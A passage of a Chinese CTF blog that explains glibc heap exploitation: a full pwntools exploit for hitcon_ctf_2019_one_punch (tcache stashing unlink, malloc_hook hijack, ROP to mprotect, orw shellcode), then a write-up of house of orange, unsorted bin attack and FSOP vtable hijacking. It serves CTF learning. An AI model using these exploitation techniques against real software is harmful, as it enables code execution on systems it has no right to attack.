class="number">0x1370</span>-<span class="number">8</span>)+p64(<span class="number">0x0000000000058373</span>+libc_base)</span><br><span class="line">p.sendafter(<span class="string">&quot;What do you want to say?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221022100258683.png" alt="image-20221022100258683"></p>
<h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><h4 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h4><img src="../img/image-20221026213251795.png" alt="image-20221026213251795" style="zoom:50%;" />

<img src="../img/image-20221026213527448.png" alt="image-20221026213527448" style="zoom:50%;" />

<h4 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h4><p>这道题考察的是tcache stashing unlink attack，不过由于本题开了沙箱，所以最后需要用orw获取flag。</p>
<p>程序给了个后门(可以调用malloc，篡改malloc_hook劫持执行流)，不过需要用tcache stashing unlink attack来触发这个后门，利用libc里的一个gadget(add rsp,0x48;ret)将其写到malloc_hook里，直接控制程序执行流。</p>
<p>利用那个gadget能控制执行流的原因是因为程序询问size的时候，输入到栈里的数据太大了。(如下)</p>
<p><img src="/../img/image-20221026220856636.png" alt="image-20221026220856636"></p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26802&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content*size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0xC388</span>))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_chain</span>():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base=recv_libc()-<span class="number">0x1e4ca0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> libc_base,leak_heap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_into_smallbin</span>():</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x1</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>).ljust(<span class="number">0x2f0</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#first get into small bin</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;f&#x27;</span>)<span class="comment">#prevent merged chunk</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x2f0</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;g&#x27;</span>)<span class="comment">#second get into small bin</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>(<span class="params">leak_heap,libc_base</span>):</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    add_rsp_ret=<span class="number">0x000000000008cfd6</span>+libc_base</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x210</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x2f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(leak_heap-<span class="number">0x560</span>)+p64(leak_heap-<span class="number">0x26f0</span>-<span class="number">0x10</span>-<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">    backdoor(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">    backdoor(p64(add_rsp_ret))</span><br><span class="line">    pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x000000000010cc80</span></span><br><span class="line">    read_addr=libc_base+<span class="number">0x000000000010cf70</span></span><br><span class="line">    write_addr=libc_base+<span class="number">0x000000000010d010</span></span><br><span class="line">    flag_addr=libc_base+<span class="number">0x0000000000016239</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000026bd4</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x0000000000047cf8</span></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x0000000000117590</span></span><br><span class="line">    </span><br><span class="line">    rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">    rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">    rop+=p64(mprotect_addr)</span><br><span class="line">    rop+=p64(leak_heap+<span class="number">0x1180</span>)</span><br><span class="line">    rop+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">20</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x16DE</span>,<span class="number">0x16ea</span>,<span class="number">0x16f6</span>,<span class="number">0x1702</span>,<span class="number">0x15C3</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">1</span>,rop)</span><br><span class="line">    </span><br><span class="line">create_chain()</span><br><span class="line">libc_base,leak_heap=leak_addr()</span><br><span class="line">get_into_smallbin()</span><br><span class="line">tcache_stashing_unlink_attack(leak_heap,libc_base)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221026221010006.png" alt="image-20221026221010006"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173?display=mobile#h2-0">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46521144/article/details/119536209">https://blog.csdn.net/weixin_46521144/article/details/119536209</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/f0d8c344.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/f0d8c344.html" class="post-title-link" itemprop="url">关于house of orange(unsorted bin attack &&FSOP)的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:52:08" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>通过学习house of orange，又对unsorted bin attack以及FSOP有了一些新的理解。说到底house of orange本身的效果很小，但加上两个组合拳(unsorted bin attack和FSOP)则威力就会变的很大。这篇文章我将对这三种手法都详细记录一下原理和利用方式，最后放上例题。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在此，先对house of orange以及后续整体的流程简单总结一下：</p>
<blockquote>
<p> 最开始我们先用house of orange将原本的top chunk放入unsorted bin中。然后利用溢出篡改unsorted bin里的chunk的size为0x60，同时还篡改了该chunk的bk指针。最后我们申请一个任意大小的chunk，开始触发攻击链，首先ptmalloc会先遍历unsorted bin(此时前面已经遍历了fast bin和small bin)，ptmalloc的策略是一边遍历unsorted bin尝试寻找和自己需要的size完全相同的chunk，一边给不符合条件的chunk分下类(也就是放到small bin或者large bin)。在分类的时候就会将在unsorted bin上的chunk给脱链，然后触发unsorted bin attack，此时的IO_list_all被写入main_arena+88的地址，然后发现chunk的size为0x60，于是给划分到了small bin里。而_IO_2_1_stderr的_chain字段正好落在了small bin[0x60]上，于是乎我们就控制了_IO_2_1_stdout里的内容。然后为了接下来的FSOP攻击做好布局(控制stdout结构体其实就是堆溢出来编辑最开始进入的那个unsorted bin里的堆块内容)。然后ptmalloc还会继续去遍历unsorted bin(因为unsorted bin被unsorted bin attack攻击破坏的原因，让ptmalloc以为unsorted bin还有chunk)，但是此时的victim(也就是当前unsorted bin准备链出的chunk)已经是最开始覆盖unsorted bin bk的值了(也就是IO_list_all-0x10)。然此时的victim-&gt;size为0，没有通过检查，于是就触发了malloc_printerr，调用了abort，最终刷新所有文件流的时候，到stdout结构体时触发了FSOP，成功获取shell。</p>
</blockquote>
<p>其实整体流程就是把后续的unsorted bin attack和FSOP运用到了极致。</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><blockquote>
<p>什么是house of orange?</p>
<p>house of orange该攻击手法是在我们没有free函数的情况下，来获得一个在unsorted bin中的堆块。house of orange到这里就结束了，但之后还会利用其他的手法来拿到shell。</p>
<p>原理：</p>
<p>如果我们申请的堆块大小大于了top chunk size的话，那么就会将原来的top chunk放入unsorted bin中，然后再映射或者扩展一个新的top chunk出来。</p>
<p>利用过程：</p>
<p>1、先利用溢出等方式进行篡改top chunk的size(具体要求的话下面再说)</p>
<p>2、然后申请一个大于top chunk的size</p>
</blockquote>
<p>然后主要说一下我们具体需要绕过的检查</p>
<p>主要就是下面两个断言(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;<span class="comment">//原本old top chunk的地址</span></span><br><span class="line">old_size = chunksize (old_top);<span class="comment">//原本old top chunk的size</span></span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//old top chunk的地址加上其size</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果是第一次调用该函数，那么top chunk是没有被初始化的，并且其size自然为0 ，我们利用的时候，这里肯定不成立，暂且不用管</p>
<p>如果上面这个条件不成立的话，就需要保证原本old top chunk的size大于MINSIZE,还需要保证原本old top chunk的prev_inuse位是1,并且原本old top chunk的地址加上其size之后的地址要与页对齐 也就是address&amp;0xfff&#x3D;0x000。最后old chunk的size必须要小于我们申请的堆块大小加上MINSIZE。</p>
<p>最后就是要注意如果我们申请的堆块大于了0x20000，那么将会是mmap映射出来的内存，并非是扩展top chunk了。</p>
<p>总结下，我们需要绕过检查所需要构造的值：</p>
<p>old_top_size(我们通过溢出修改)     nb（我们申请的堆块大小）</p>
<blockquote>
<p>MINSIZE&lt;old_top_size&lt;nb+MINSIZE</p>
<p>old_top_size的prev_size位是1</p>
<p>(old_top_size+old_top)&amp;0xfff&#x3D;0x000</p>
<p>nb&lt;0x20000</p>
</blockquote>
<p>构造完成后，我们申请出来nb大小的堆块，那么top chunk就会进入到unsorted bin中。</p>
<p><img src="/../img/2706180-20220920201613897-1312734603.png"></p>
<p><img src="/../img/2706180-20220920201634834-439114022.png"></p>
<p>此时就完成了攻击前的准备阶段，而接下来需要先介绍一下unsorted bin attack。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bin attack这个攻击手法最终可以实现往一个指定地址里写入一个很大的数据（main_arena+88或main_arena+96）</p>
<p>关于这个手法的学习，必须要搞清楚两件事，不然理解起来挺懵的。</p>
<p>第一、从unsorted bin中取堆块的时候，是从尾部取的堆块。</p>
<p><img src="/../img/2706180-20220920201921204-253619976.png"></p>
<p>第二、把上述的情况，画成图，应该是下面这个样子</p>
<p><img src="/../img/2706180-20220920202016161-564133422.png"></p>
<p>知道上面这两件事之后，下面理解起来就很容易了。</p>
<p>就是当从unsorted bin中拿取最后一个堆块时（unsorted bin中堆块是从最后一个取的，跟fastbin和tcachebin还不一样），会触发下面这部分的操作。<strong>(下面这部分操作是在遍历unsorted bin给其堆块分类到small bin或者large bin中完成的，也就是说我们只要覆写了unsorted bin中chunk的bk指针，在下一次遍历unsorted bin的时候，都可以让bk+0x10的位置写入main_arena+88&#x2F;96的地址(无论nb是否等于size)，但是如果申请的大小不等同于原本位于unsorted bin中的堆块，就会在后续的检查中导致程序崩溃。)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">bck = victim-&gt;bk</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>

<p>如果看着代码挺懵，我就简单分析一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">这个就是说把main_arena（这里的main_arena我的指的是上图的那个main_arena bins[0,1]这个块)的bk指针指向的内容（也就是chunk3的地址）给victim</span><br><span class="line">换言之，这行代码的意思就是说victim就是chunk3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk</span><br><span class="line">这个就是把chunk3的bk指针指向的内容（也就是chunk2)给bck</span><br><span class="line">换言之，这行代码的意思就是说bck就是chunk2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">这个就是把现在的chunk2地址给main_arena的bk指针</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br><span class="line">这个就是把main_arena的地址给bck（也就是chunk2)的fd指针</span><br></pre></td></tr></table></figure>

<p>而这四步之后，也就将chunk3从这个双向链表中踢了出去。</p>
<p>这四步中，我们可以从第二步进行攻击，如果我们可以利用溢出来伪造这个bck(也就是victim-&gt;bk，<strong>大白话就是用溢出unsorted bin中的尾部的chunk的bk指针（fd指针无所谓）</strong>），这就意味着我们可以将unsorted_chunks (av)(这个也就是main_arena+88&#x2F;96的地址)写入到我们伪造的bck-&gt;fd(也就是bck+0x10)中。<strong>如果我们将伪造的地址先-0x10，那么最后这个伪造的地址就会被写入main_arena+88或main_arena+96的地址。</strong>伪造之后，我们从unsorted bin中将堆块申请出来<strong>(如果篡改的这个位于unsorted bin中的堆块size为0x900，那就必须要申请0x900堆块，不能小于(因为这样会将堆块进行切割)也不能大于(因为大于的话就不会从unsorted bin中拿堆块了))，当把0x900的堆块申请出来时，就完成了地址写入。</strong></p>
<p>听起来感觉挺秀，但是仔细一想似乎没啥用，好像这只能把一个很大的数值写到我们指定的地点（因此这个攻击也是一个辅助的攻击手段，还需要配合其他攻击才能发挥出来相当大的效果）。</p>
<blockquote>
<p><strong>注意：由于执行完unsorted bin attack 后的chunk2已经变成了一个libc中的地址（应该是main_arena+88的地址），接下来再从unsorted bin中申请堆块时，执行bck-&gt;fd这步试图往libc这个不可写的地址写入数据，而导致程序崩溃。<u>所以unosrtedbin attack之后，无法再从unsorted bin中申请堆块了</u></strong></p>
</blockquote>
<p>配合刚才的house of orange攻击后产生的位于unsorted bin中的堆块，如果我们能够覆盖这个位于unsorted bin中堆块的bk指针，那么我们就能够往任意地址写一个main_arena+88(96)。而我们要去通过unsorted bin attack向_IO_list_all写入这个地址main_arena+88,然后去打一个FSOP。</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h2><p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p>
<p>而前面提到了，我们将IO_FILE结构体落在我们可控的内存上，这就意味着我们是可以控制vtable的，<strong>我们将vtable中的_IO_overflow函数地址改成system地址即可</strong>，而这个函数的第一个参数就是IO_FILE结构体的地址，因此我们让IO_FILE结构体中的flags成员为&#x2F;bin&#x2F;sh字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程时</strong>或者<strong>程序从main函数返回时</strong>触发了_IO_flush_all_lockp即可拿到shell</p>
<p>下面是链表的正常结构</p>
<p><img src="/../img/2706180-20220920202054550-1462970818.png"></p>
<p>下面是FSOP的布局，首先篡改_IO_list_all为main_arena+88这个地址(因为这片内存是不可控的)，chain字段是首地址加上0x68偏移得到的。因此chain字段决定了下一个IO_FILE结构体的地址为main_arena+88+0x68，这个地址恰好是smallbin中size为0x60的数组，如果我们能将一个chunk放到这个small bin中size为0x60的链上，那么篡改_IO_list_all为main_arena+88这个地址后，small bin中的chunk就是IO_FILE结构体了，将其申请出来后，我们就可以控制这块内存了，从而伪造vtable字段进行布局最终拿到shell。</p>
<p><img src="/../img/2706180-20220920202121457-1221438245.png"></p>
<p>下面说一下布局时需要篡改哪些字段来绕过if的检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure>

<p>观察上面的代码发现，如果我们要想执行_IO_OVERFLOW (fp, EOF)就需要让最外面的if中&amp;&amp;前面的那部分成立，而这部分中间又用了一个||来连接两个条件，分别是<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>和<code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base</code><br>这两部分条件任意满足一处即可，前面那个部分的条件满足起来很省事，我们只需要让mode&#x3D;0,_IO_write_ptr&#x3D;1,_IO_write_base&#x3D;0即可(这仨值改成其他的也行，只需要满足条件即可)，这样就会触发_IO_OVERFLOW。</p>
<p><strong>注意：</strong></p>
<p>为什么house of orange后打FSOP成功的概率是1&#x2F;2？</p>
<p>由于触发了_IO_flush_all_lockp函数，会根据_IO_list_all和chain字段来去依次遍历链表上的每个结构体，在我们整体布局完成后，第一个结构体就是从main_arena+88开始。而第一个结构体的mode字段是main_arena+88+0xc0处的数据决定的(如下图)。<strong>mode字段是四字节</strong></p>
<p><img src="/../img/2706180-20220920202140803-372395368.png"></p>
<p>而上面这个地址由于libc地址随机化 导致这个值的补码可能是正也可能是负，也就是说这四个字节可能是0到0xffffffff之间的任意值，但是如果大于0x7fffffff的话该值就为负，小于则为正。这个0xffffffff&#x2F;2的值 正好就是最大的正值为0x7fffffff 所以刚好_mode字段为负的概率是1&#x2F;2</p>
<p><strong>那为啥非要这个mode字段为负才行呢？</strong></p>
<p>因为倘若mode为正，则上面if检查的这部分<code>fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 就会成立。这样就会触发_IO_OVERFLOW函数(可此时在遍历第一个IO_FILE结构体)，但是我们的布局是在第二个IO_FILE结构体上，我们需要的是遍历到第二个IO_FILE结构体的时候触发 IO_OVERFLOW函数。如果遍历第一个结构体时触发了_IO_OVERFLOW函数,程序则会崩溃，因为我们无法控制vtable表项。</p>
<blockquote>
<p>house of orange中的函数调用流程为：</p>
<p>__libc_malloc-&gt;malloc_printerr-&gt;libc_message-&gt;abort-&gt;_IO_flush_all_lockp</p>
</blockquote>
<p>IO_FILE结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>vtable中的函数指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span 